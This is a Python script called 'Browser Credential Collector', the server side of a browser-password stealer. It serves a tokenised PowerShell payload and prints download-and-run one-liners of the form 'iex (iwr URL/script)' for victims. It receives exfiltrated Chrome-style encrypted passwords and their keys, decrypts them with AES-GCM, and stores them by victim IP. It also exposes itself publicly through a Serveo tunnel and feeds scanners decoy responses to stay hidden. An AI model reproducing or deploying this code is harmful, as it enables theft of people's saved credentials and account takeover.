#!/usr/bin/env python3
import os, json, base64, datetime, socket, re, uuid, time, sys, platform
import subprocess
import threading
import signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict

# For screen clearing
if platform.system() == 'Windows':
    clear_command = 'cls'
else:
    clear_command = 'clear'

def clear_screen():
    os.system(clear_command)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5000
SAVE_DIRECTORY = 'credentials'
POWERSHELL_SCRIPT = "local.ps1"  # PowerShell script to update
USE_SERVEO = True  # Enable Serveo tunneling
PUBLIC_URL = None  # Will be populated with Serveo's URL

valid_tokens = {}

credential_files = []

stats = {
    "total_credentials": 0,
    "unique_sources": set(),
    "unique_browsers": set(),
    "success_count": 0,
    "failure_count": 0,
    "rejected_requests": 0,
    "scripts_served": 0,
    "blocked_ips": 0,
    "scanner_ips_detected": 0
}

SUSPICIOUS_PATHS = [
    '/wp-admin', '/wp-login', '/admin', '/login', '/phpmyadmin',
    '/.git', '/.env', '/config', '/backup', '/wordpress',
    '/xmlrpc.php', '/wp-content', '/robots.txt', '/sitemap.xml',
    '/shell', '/cgi-bin', '/vendor', '/.well-known'
]
scanner_ips = set()  # IPs identified as scanners
blocked_ips = set()  # IPs completely blocked

RATE_LIMIT_REQUESTS = 30  # Max requests
RATE_LIMIT_WINDOW = 60    # Time window in seconds
rate_limit_counters = defaultdict(list)  # IP -> [timestamp1, timestamp2, ...]

# Serveo process handler
serveo_process = None
serveo_log = []

try:
    from Crypto.Cipher import AES
except ImportError:
    # Simple AES placeholder if pycryptodome not available
    class SimpleAES:
        MODE_GCM = 0
        class GCMCipher:
            def __init__(self, key, nonce): self.key = key; self.nonce = nonce
            def decrypt_and_verify(self, ciphertext, tag):
                return b"[Install pycryptodome for actual decryption]"
        @staticmethod    
        def new(key, mode, nonce=None):
            return SimpleAES.GCMCipher(key, nonce)
    AES = SimpleAES
    print(f"{Colors.YELLOW}⚠ WARNING: pycryptodome not found, install with: pip install pycryptodome{Colors.ENDC}")

def check_rate_limit(ip_address):
    """
    Check if an IP has exceeded the rate limit
    Returns: (bool) True if allowed, False if rate limited
    """
    # If IP is in blocked list, immediately reject
    if ip_address in blocked_ips:
        return False
        
    current_time = time.time()
    
    # Remove timestamps older than the window
    rate_limit_counters[ip_address] = [
        timestamp for timestamp in rate_limit_counters[ip_address]
        if current_time - timestamp < RATE_LIMIT_WINDOW
    ]
    
    # Check if the IP has exceeded the limit
    if len(rate_limit_counters[ip_address]) >= RATE_LIMIT_REQUESTS:
        # If they've exceeded rate limits twice in a row, block them
        if len(rate_limit_counters[ip_address]) >= RATE_LIMIT_REQUESTS * 2:
            blocked_ips.add(ip_address)
            stats["blocked_ips"] += 1
            add_log_entry(f"{Colors.RED}Permanently blocking IP {Colors.CYAN}{ip_address}{Colors.RED} for excessive requests{Colors.ENDC}")
        return False
    
    # Add the current timestamp
    rate_limit_counters[ip_address].append(current_time)
    return True

def is_scanner(ip_address, path):
    """
    Check if an IP is showing scanner behavior based on the requested path
    """
    # If already identified as a scanner
    if ip_address in scanner_ips:
        return True
    
    # If in blocked list, immediately identify as scanner
    if ip_address in blocked_ips:
        return True
    
    # Check if the path matches known scanning patterns
    for suspicious_path in SUSPICIOUS_PATHS:
        if suspicious_path in path:
            # Add to scanner list
            scanner_ips.add(ip_address)
            stats["scanner_ips_detected"] += 1
            add_log_entry(f"{Colors.RED}Scanner detected: {Colors.CYAN}{ip_address}{Colors.RED} (tried {path}){Colors.ENDC}")
            
            # If they've tried multiple suspicious paths, block them
            if ip_address in rate_limit_counters and len(rate_limit_counters[ip_address]) > 5:
                blocked_ips.add(ip_address)
                stats["blocked_ips"] += 1
                add_log_entry(f"{Colors.RED}Permanently blocking scanner IP {Colors.CYAN}{ip_address}{Colors.ENDC}")
                
            return True
    
    return False

def generate_one_time_token():
    """Generate a unique token that will be valid for one request"""
    token = f"CRED-{uuid.uuid4().hex}-{int(time.time())}"
    # Store token with creation timestamp
    valid_tokens[token] = time.time()
    return token

def is_valid_token(token):
    """Check if token is valid (exists and has not been used before)"""
    return token in valid_tokens

def invalidate_token(token):
    """Remove token from valid tokens after use"""
    if token in valid_tokens:
        del valid_tokens[token]

def clean_expired_tokens(max_age=3600):  # Default: 1 hour expiration
    """Remove tokens that are older than max_age seconds"""
    current_time = time.time()
    expired_tokens = [token for token, timestamp in valid_tokens.items() 
                     if current_time - timestamp > max_age]
    
    for token in expired_tokens:
        del valid_tokens[token]
    
    return len(expired_tokens)

def decrypt_password(key, encrypted_password):
    try:
        key = base64.b64decode(key)
        encrypted_bytes = base64.b64decode(encrypted_password)
        
        if len(encrypted_bytes) > 3 and encrypted_bytes[:3] == b'v10':
            nonce = encrypted_bytes[3:15]
            ciphertext = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                return "[Decryption Error]"
        else:
            nonce = encrypted_bytes[:12]
            ciphertext = encrypted_bytes[12:-16]
            tag = encrypted_bytes[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                return "[Decryption Error]"
    except Exception as e:
        return f"[Error: {str(e)}]"

def process_credentials(credentials, client_ip):
    success_count = 0
    failure_count = 0
    
    for cred in credentials:
        # Attempt to decrypt the password
        decrypted_password = decrypt_password(cred["key"], cred["encrypted_password"])
        
        # Update cred with decrypted password
        cred["password"] = decrypted_password
        cred["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cred["source_ip"] = client_ip
        
        # Update stats
        stats["total_credentials"] += 1
        stats["unique_sources"].add(client_ip)
        if "browser" in cred:
            stats["unique_browsers"].add(cred["browser"])
        
        # Count success/failure
        if decrypted_password.startswith("["):
            failure_count += 1
            stats["failure_count"] += 1
        else:
            success_count += 1
            stats["success_count"] += 1
    
    return {
        "decrypted_credentials": credentials,
        "summary": {
            "success_count": success_count,
            "failure_count": failure_count,
            "total_count": len(credentials),
            "source_ip": client_ip
        }
    }

def render_dashboard():
    """Render the dashboard with updated information"""
    # Clear screen first
    clear_screen()
    
    # Clean expired tokens
    expired_count = clean_expired_tokens()
    
    # Current time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Build and display the dashboard
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("┌─────────────────────────────────────────────────────────────┐")
    print("│                 BROWSER CREDENTIAL COLLECTOR                 │")
    print("└─────────────────────────────────────────────────────────────┘")
    print(f"{Colors.ENDC}")
    
    print(f"{Colors.BOLD}Server Information:{Colors.ENDC}")
    local_ip = get_local_ip()
    print(f"  • Local URL:     http://localhost:{SERVER_PORT}")
    print(f"  • Network URL:   http://{local_ip}:{SERVER_PORT}")
    if USE_SERVEO and PUBLIC_URL:
        print(f"  • {Colors.GREEN}Public URL:    {PUBLIC_URL}{Colors.ENDC}")
    print(f"  • Script URL:    http://{local_ip}:{SERVER_PORT}/script")
    if USE_SERVEO and PUBLIC_URL:
        print(f"  • {Colors.GREEN}Public Script: {PUBLIC_URL}/script{Colors.ENDC}")
    print(f"  • Storage Path:  {os.path.abspath(SAVE_DIRECTORY)}")
    print(f"  • Current Time:  {current_time}")
    print()
    
    print(f"{Colors.BOLD}Collection Statistics:{Colors.ENDC}")
    print("┌────────────────────────────┬──────────┐")
    print(f"│ Total Credentials          │ {Colors.GREEN}{stats['total_credentials']:<8}{Colors.ENDC} │")
    print(f"│ Successfully Decrypted     │ {Colors.GREEN}{stats['success_count']:<8}{Colors.ENDC} │")
    print(f"│ Failed to Decrypt          │ {Colors.YELLOW}{stats['failure_count']:<8}{Colors.ENDC} │")
    print(f"│ Unique IP Sources          │ {Colors.CYAN}{len(stats['unique_sources']):<8}{Colors.ENDC} │")
    print(f"│ Unique Browsers            │ {Colors.CYAN}{len(stats['unique_browsers']):<8}{Colors.ENDC} │")
    print(f"│ Scripts Served             │ {Colors.BLUE}{stats['scripts_served']:<8}{Colors.ENDC} │")
    print(f"│ Active Tokens              │ {Colors.BLUE}{len(valid_tokens):<8}{Colors.ENDC} │")
    print(f"│ Expired Tokens Cleaned     │ {Colors.YELLOW}{expired_count:<8}{Colors.ENDC} │")
    print(f"│ Rejected Requests          │ {Colors.RED}{stats['rejected_requests']:<8}{Colors.ENDC} │")
    print(f"│ Scanner IPs Detected       │ {Colors.RED}{stats['scanner_ips_detected']:<8}{Colors.ENDC} │")
    print(f"│ Blocked IPs                │ {Colors.RED}{stats['blocked_ips']:<8}{Colors.ENDC} │")
    print("└────────────────────────────┴──────────┘")
    print()
    
    print(f"{Colors.BOLD}Recent Events:{Colors.ENDC}")
    
    # Show last 5 log entries
    log_entries = get_recent_logs(5)
    if log_entries:
        for entry in log_entries:
            print(f"  {entry}")
    else:
        print("  No recent events.")
    print()
    
    if USE_SERVEO and serveo_log:
        print(f"{Colors.BOLD}Serveo Tunnel Status:{Colors.ENDC}")
        for entry in serveo_log[-3:]:  # Show last 3 Serveo related logs
            print(f"  {entry}")
        print()
    
    print(f"{Colors.BOLD}Collected Credential Files:{Colors.ENDC}")
    if credential_files:
        for i, file_info in enumerate(credential_files[-10:], 1):  # Show last 10 files
            path = file_info["path"]
            count = file_info["count"]
            ip = file_info["ip"]
            timestamp = file_info["timestamp"]
            print(f"  {i}. {Colors.CYAN}{ip}{Colors.ENDC} - {count} credentials - {timestamp}")
            print(f"     {Colors.YELLOW}{os.path.abspath(path)}{Colors.ENDC}")
    else:
        print("  No credential files collected yet.")
    print()
    
    if blocked_ips:
        print(f"{Colors.BOLD}Currently Blocked IPs:{Colors.ENDC}")
        for i, ip in enumerate(list(blocked_ips)[:10], 1):  # Show first 10 blocked IPs
            print(f"  {i}. {Colors.RED}{ip}{Colors.ENDC}")
        if len(blocked_ips) > 10:
            print(f"  ... and {len(blocked_ips) - 10} more")
        print()
    
    print(f"{Colors.BOLD}Status: {Colors.GREEN}Running{Colors.ENDC} - Press Ctrl+C to stop the server")

# Log handling
log_entries = []

def add_log_entry(entry):
    """Add a log entry with timestamp"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    log_entries.append(f"{Colors.BOLD}[{timestamp}]{Colors.ENDC} {entry}")

def get_recent_logs(count=5):
    """Get the most recent log entries"""
    return log_entries[-count:] if log_entries else []

def get_powershell_script_with_token(token):
    """Read the PowerShell script and replace both the DEFAULT_TOKEN_VALUE and SERVER_URL_PLACEHOLDER"""
    try:
        if not os.path.exists(POWERSHELL_SCRIPT):
            return None, "PowerShell script not found"
        
        with open(POWERSHELL_SCRIPT, 'r') as f:
            content = f.read()
        
        # Determine which URL to use for the PowerShell script
        if USE_SERVEO and PUBLIC_URL:
            server_url = f"{PUBLIC_URL}/receive_credentials"
        else:
            local_ip = get_local_ip()
            server_url = f"http://{local_ip}:{SERVER_PORT}/receive_credentials"
        
        # Replace both placeholders
        if "DEFAULT_TOKEN_VALUE" in content and "SERVER_URL_PLACEHOLDER" in content:
            modified_content = content.replace("DEFAULT_TOKEN_VALUE", token)
            modified_content = modified_content.replace("SERVER_URL_PLACEHOLDER", server_url)
            return modified_content, None
        elif "DEFAULT_TOKEN_VALUE" in content:
            # Only replace token if server URL placeholder not found (for backward compatibility)
            modified_content = content.replace("DEFAULT_TOKEN_VALUE", token)
            return modified_content, None
        else:
            return None, "Token placeholder not found in PowerShell script"
        
    except Exception as e:
        return None, f"Error updating PowerShell script: {str(e)}"

class CredentialServerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override to disable automatic logging
        return
    
    def _set_response(self, status_code=200, content_type='application/json'):
        try:
            self.send_response(status_code)
            self.send_header('Content-type', content_type)
            self.end_headers()
        except (BrokenPipeError, ConnectionResetError):
            # Client disconnected before we could send headers
            client_ip = self.client_address[0]
            add_log_entry(f"{Colors.YELLOW}Client {Colors.CYAN}{client_ip}{Colors.YELLOW} disconnected during header send{Colors.ENDC}")
            render_dashboard()
            return
    
    def _check_user_agent_token(self):
        """Check if User-Agent header contains a valid token"""
        user_agent = self.headers.get('User-Agent', '')
        
        # Extract token if it matches our format
        token_match = re.search(r'CRED-([a-f0-9]{32}-\d+)', user_agent)
        if token_match:
            token = f"CRED-{token_match.group(1)}"
            is_valid = is_valid_token(token)
            return token if is_valid else None
        
        # If no CRED- token, check if the entire User-Agent is a token
        if user_agent in valid_tokens:
            return user_agent
            
        return None
    
    def do_GET(self):
        client_ip = self.client_address[0]
        
        # Check if IP is blocked
        if client_ip in blocked_ips:
            self._set_response(403, 'text/plain')
            try:
                self.wfile.write(b'Forbidden')
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
            
        # Apply rate limiting
        if not check_rate_limit(client_ip):
            stats["rejected_requests"] += 1
            add_log_entry(f"{Colors.RED}Rate limited request from {Colors.CYAN}{client_ip}{Colors.ENDC}")
            render_dashboard()
            self._set_response(429, 'text/plain')  # 429 = Too Many Requests
            try:
                self.wfile.write(b'Too Many Requests')
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
            
        # Check for scanner behavior
        if is_scanner(client_ip, self.path):
            stats["rejected_requests"] += 1
            # Return a fake response to waste their time or redirect them
            self._set_response(200, 'text/html')
            try:
                self.wfile.write(b'<html><body><h1>It works!</h1></body></html>')
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
        
        try:
            if self.path == '/':
                self._set_response(200, 'text/plain')
                self.wfile.write(b'403 Access Forbidden')
            
            elif self.path == '/script' or self.path == '/local.ps1':
                # Generate a new token for this request
                token = generate_one_time_token()
                
                # Get the PowerShell script with the token
                script_content, error = get_powershell_script_with_token(token)
                
                if error:
                    self._set_response(500, 'text/plain')
                    self.wfile.write(f"Error: {error}".encode('utf-8'))
                    add_log_entry(f"{Colors.RED}Failed to serve script to {client_ip}: {error}{Colors.ENDC}")
                    render_dashboard()
                    return
                
                # Serve the script
                self._set_response(200, 'text/plain')
                self.wfile.write(script_content.encode('utf-8'))
                
                # Update stats
                stats["scripts_served"] += 1
                
                # Log the token issuance
                add_log_entry(f"{Colors.GREEN}Served script to {Colors.CYAN}{client_ip}{Colors.GREEN} with token {Colors.YELLOW}{token[:16]}...{Colors.ENDC}")
                render_dashboard()
            
            else:
                self._set_response(404, 'text/plain')
                self.wfile.write(b'Not Found')
                
        except BrokenPipeError:
            # Client disconnected before we could send the full response
            add_log_entry(f"{Colors.YELLOW}Client {Colors.CYAN}{client_ip}{Colors.YELLOW} disconnected early (Broken pipe){Colors.ENDC}")
            render_dashboard()
            return
        except ConnectionResetError:
            # Connection reset by client
            add_log_entry(f"{Colors.YELLOW}Connection reset by client {Colors.CYAN}{client_ip}{Colors.ENDC}")
            render_dashboard()
            return
        except Exception as e:
            # Handle any other exceptions
            add_log_entry(f"{Colors.RED}Error handling GET request from {Colors.CYAN}{client_ip}{Colors.RED}: {str(e)}{Colors.ENDC}")
            render_dashboard()
            return
    
    def do_POST(self):
        client_ip = self.client_address[0]
        
        # Check if IP is blocked
        if client_ip in blocked_ips:
            self._set_response(403, 'text/plain')
            try:
                self.wfile.write(b'Forbidden')
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
            
        # Apply rate limiting
        if not check_rate_limit(client_ip):
            stats["rejected_requests"] += 1
            add_log_entry(f"{Colors.RED}Rate limited request from {Colors.CYAN}{client_ip}{Colors.ENDC}")
            render_dashboard()
            self._set_response(429, 'text/plain')  # 429 = Too Many Requests
            try:
                self.wfile.write(b'Too Many Requests')
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
        
        try:
            if self.path != '/receive_credentials':
                add_log_entry(f"{Colors.RED}Rejected request from {Colors.CYAN}{client_ip}{Colors.RED}: wrong endpoint{Colors.ENDC}")
                render_dashboard()
                self._set_response(404)
                return
            
            # Check User-Agent for valid token
            token = self._check_user_agent_token()
            
            if not token:
                # Reject the request with 404 to hide the fact this is the correct endpoint
                stats["rejected_requests"] += 1
                add_log_entry(f"{Colors.RED}Rejected unauthorized request from {Colors.CYAN}{client_ip}{Colors.RED}: invalid token{Colors.ENDC}")
                render_dashboard()
                self._set_response(404)
                return
                
            # Read request body
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            
            # Parse JSON
            credentials = json.loads(body.decode('utf-8'))
            
            if not credentials:
                self._set_response(400)
                self.wfile.write(json.dumps({"status": "error", "message": "No credentials received"}).encode('utf-8'))
                add_log_entry(f"{Colors.YELLOW}Empty credential submission from {Colors.CYAN}{client_ip}{Colors.ENDC}")
                render_dashboard()
                return
            
            # Ensure save directory exists
            if not os.path.exists(SAVE_DIRECTORY):
                os.makedirs(SAVE_DIRECTORY)
            
            # Process credentials
            processed_data = process_credentials(credentials, client_ip)
            
            # Save with IP in filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            token_short = token.split('-')[1][:8] if '-' in token else "direct"  # Use part of the token as identifier
            filename = f"{client_ip.replace('.', '_')}_{token_short}_{timestamp}.json"
            file_path = os.path.join(SAVE_DIRECTORY, filename)
            
            with open(file_path, 'w') as f:
                json.dump(processed_data["decrypted_credentials"], f, indent=2)
            
            # Add to credential files list
            credential_files.append({
                "path": file_path,
                "count": len(credentials),
                "ip": client_ip,
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # Log the success
            add_log_entry(f"{Colors.GREEN}Received {len(credentials)} credentials from {Colors.CYAN}{client_ip}{Colors.GREEN} ({processed_data['summary']['success_count']} decrypted){Colors.ENDC}")
            
            # Invalidate the token after successful use
            invalidate_token(token)
            
            # Update the display
            render_dashboard()
            
            # Return success
            self._set_response(200)
            response = {
                "status": "success", 
                "message": "Credentials received and securely stored",
                "file": file_path,
                "summary": processed_data["summary"]
            }
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        except BrokenPipeError:
            # Client disconnected before we could send the full response
            add_log_entry(f"{Colors.YELLOW}Client {Colors.CYAN}{client_ip}{Colors.YELLOW} disconnected early (Broken pipe){Colors.ENDC}")
            render_dashboard()
            return
        except ConnectionResetError:
            # Connection reset by client
            add_log_entry(f"{Colors.YELLOW}Connection reset by client {Colors.CYAN}{client_ip}{Colors.ENDC}")
            render_dashboard()
            return
        except json.JSONDecodeError:
            # Invalid JSON
            add_log_entry(f"{Colors.RED}Invalid JSON received from {Colors.CYAN}{client_ip}{Colors.ENDC}")
            self._set_response(400)
            self.wfile.write(json.dumps({"status": "error", "message": "Invalid JSON format"}).encode('utf-8'))
            render_dashboard()
            return
        except Exception as e:
            # Log the exception but don't crash
            add_log_entry(f"{Colors.RED}Error processing POST from {Colors.CYAN}{client_ip}{Colors.RED}: {str(e)}{Colors.ENDC}")
            self._set_response(500)
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
            render_dashboard()
            return

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return '127.0.0.1'

def serveo_tunnel_reader(process):
    """Read and process output from Serveo SSH tunnel process"""
    global PUBLIC_URL
    
    while True:
        try:
            line = process.stdout.readline()
            if not line:
                serveo_log.append(f"{Colors.RED}Serveo tunnel closed.{Colors.ENDC}")
                add_log_entry(f"{Colors.RED}Serveo tunnel closed unexpectedly.{Colors.ENDC}")
                break
                
            line = line.decode('utf-8').strip()
            
            # Add all output to the log
            if line and not line.startswith("Warning"):
                serveo_log.append(f"{Colors.BLUE}Serveo: {Colors.ENDC}{line}")
            
            # Try various patterns to extract the Serveo URL
            url = None
            
            # Pattern 1: "Forwarding HTTP traffic from X to Y"
            if 'Forwarding HTTP traffic from' in line:
                parts = line.split('Forwarding HTTP traffic from')[1].split(' to ')
                if parts:
                    url = parts[0].strip()
            
            # Pattern 2: "Assigned hostname: X -> Y"
            elif 'Assigned hostname:' in line:
                parts = line.split('Assigned hostname:')[1].split(' ->')
                if parts:
                    url = parts[0].strip()
            
            # Pattern 3: Regular expression to find serveo.net URLs
            else:
                import re
                match = re.search(r'(https?:\/\/)?([a-zA-Z0-9_-]+\.serveo\.net)(:[0-9]+)?', line)
                if match:
                    url = (match.group(1) or "https://") + match.group(2)
            
            # If we found a URL
            if url:
                # Make sure URL starts with http:// or https://
                if not url.startswith('http'):
                    url = 'https://' + url
                
                PUBLIC_URL = url
                serveo_log.append(f"{Colors.GREEN}Serveo tunnel established: {Colors.CYAN}{PUBLIC_URL}{Colors.ENDC}")
                add_log_entry(f"{Colors.GREEN}Serveo tunnel established: {Colors.CYAN}{PUBLIC_URL}{Colors.ENDC}")
                add_log_entry(f"{Colors.GREEN}\n\nYou can now run in powershell{Colors.ENDC}")
                add_log_entry(f"{Colors.CYAN}iex (iwr {PUBLIC_URL}/script)\n\n{Colors.ENDC}")
                add_log_entry(f"{Colors.GREEN}\n\nYou can now run in CMD{Colors.ENDC}")
                add_log_entry(f"{Colors.CYAN}powershell -c iex (iwr {PUBLIC_URL}/script)\n\n{Colors.ENDC}")


            # Update the display any time we get output
            render_dashboard()
            
        except Exception as e:
            serveo_log.append(f"{Colors.RED}Error reading Serveo output: {str(e)}{Colors.ENDC}")
            add_log_entry(f"{Colors.RED}Error reading Serveo output: {str(e)}{Colors.ENDC}")
            render_dashboard()
            break

def start_serveo_tunnel(port):
    """Start a Serveo SSH tunnel for the given port"""
    global serveo_process, PUBLIC_URL
    
    try:
        add_log_entry(f"{Colors.YELLOW}Starting Serveo tunnel for port {port}...{Colors.ENDC}")
        serveo_log.append(f"{Colors.YELLOW}Starting Serveo tunnel for port {port}...{Colors.ENDC}")
        
        # Check if SSH is available
        try:
            subprocess.run(['ssh', '-V'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except (subprocess.SubprocessError, FileNotFoundError):
            add_log_entry(f"{Colors.RED}SSH not found. Cannot establish Serveo tunnel.{Colors.ENDC}")
            serveo_log.append(f"{Colors.RED}SSH not found. Cannot establish Serveo tunnel.{Colors.ENDC}")
            render_dashboard()
            return False
        
        # Automatically accept host key to avoid the prompt
        ssh_command = [
            'ssh',
            '-o', 'StrictHostKeyChecking=no',  # Automatically accept host key
            '-o', 'UserKnownHostsFile=/dev/null',  # Don't save host keys
            '-R', f'80:localhost:{port}',
            'serveo.net'
        ]
        
        # Start SSH tunnel to Serveo
        serveo_process = subprocess.Popen(
            ssh_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL
        )
        
        # Start thread to read Serveo output
        threading.Thread(target=serveo_tunnel_reader, args=(serveo_process,), daemon=True).start()
        
        # Wait briefly for connection
        time.sleep(2)
        
        # Check if process is still running
        if serveo_process.poll() is not None:
            add_log_entry(f"{Colors.RED}Failed to establish Serveo tunnel. Process exited with code {serveo_process.returncode}{Colors.ENDC}")
            serveo_log.append(f"{Colors.RED}Failed to establish Serveo tunnel. Process exited with code {serveo_process.returncode}{Colors.ENDC}")
            serveo_process = None
            render_dashboard()
            return False
        
        # Success (even if we don't have the URL yet, the process is running)
        if not PUBLIC_URL:
            add_log_entry(f"{Colors.YELLOW}Serveo tunnel process started, waiting for URL...{Colors.ENDC}")
            serveo_log.append(f"{Colors.YELLOW}Serveo tunnel process started, waiting for URL...{Colors.ENDC}")
        
        render_dashboard()
        return True
    
    except Exception as e:
        add_log_entry(f"{Colors.RED}Error establishing Serveo tunnel: {str(e)}{Colors.ENDC}")
        serveo_log.append(f"{Colors.RED}Error establishing Serveo tunnel: {str(e)}{Colors.ENDC}")
        serveo_process = None
        render_dashboard()
        return False
    
def stop_serveo_tunnel():
    """Stop the Serveo SSH tunnel if it's running"""
    global serveo_process, PUBLIC_URL
    
    if serveo_process:
        try:
            # Send SIGTERM to the process group
            os.killpg(os.getpgid(serveo_process.pid), signal.SIGTERM)
        except:
            # If that fails, try direct termination
            try:
                serveo_process.terminate()
                serveo_process.wait(timeout=2)
            except:
                # If termination fails, force kill
                try:
                    serveo_process.kill()
                except:
                    pass
        
        serveo_process = None
        PUBLIC_URL = None
        add_log_entry(f"{Colors.YELLOW}Serveo tunnel stopped.{Colors.ENDC}")
        serveo_log.append(f"{Colors.YELLOW}Serveo tunnel stopped.{Colors.ENDC}")
        render_dashboard()
        return True
    
    return False

def cleanup():
    """Clean up resources before exiting"""
    # Stop Serveo tunnel if running
    if USE_SERVEO:
        stop_serveo_tunnel()
    
    print(f"\n{Colors.YELLOW}Cleaning up and exiting...{Colors.ENDC}")
    print(f"{Colors.GREEN}Thank you for using Browser Credential Collector!{Colors.ENDC}")

def run_server(host, port):
    """Run the HTTP server with optional Serveo tunnel"""
    server_address = (host, port)
    httpd = HTTPServer(server_address, CredentialServerHandler)
    
    # Start Serveo tunnel if enabled
    if USE_SERVEO:
        start_serveo_tunnel(port)
    
    # Initial dashboard render
    render_dashboard()
    
    print(f"{Colors.GREEN}Server started at http://{get_local_ip()}:{port}{Colors.ENDC}")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Server stopped by user.{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.RED}Server error: {str(e)}{Colors.ENDC}")
        print(f"{Colors.YELLOW}Attempting to restart server...{Colors.ENDC}")
        time.sleep(2)  # Wait a bit before attempting restart
        run_server(host, port)  # Recursive call to restart
    finally:
        httpd.server_close()
        # Clean up resources
        cleanup()

if __name__ == '__main__':
    # Handle signals for clean shutdown
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
    
    if not os.path.exists(SAVE_DIRECTORY):
        os.makedirs(SAVE_DIRECTORY)
    
    import argparse
    parser = argparse.ArgumentParser(description='Browser Credential Collector')
    parser.add_argument('--port', type=int, default=SERVER_PORT, help='Port to listen on')
    parser.add_argument('--no-serveo', action='store_true', help='Disable Serveo tunneling')
    parser.add_argument('--clear-blocked', action='store_true', help='Clear blocked IPs on startup')
    
    args = parser.parse_args()
    
    SERVER_PORT = args.port
    USE_SERVEO = not args.no_serveo
    
    if args.clear_blocked:
        print(f"{Colors.YELLOW}Clearing blocked IPs on startup{Colors.ENDC}")
        blocked_ips = set()
    
    try:
        run_server(SERVER_HOST, SERVER_PORT)
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"{Colors.RED}Fatal error: {str(e)}{Colors.ENDC}")
        cleanup()
        sys.exit(1)
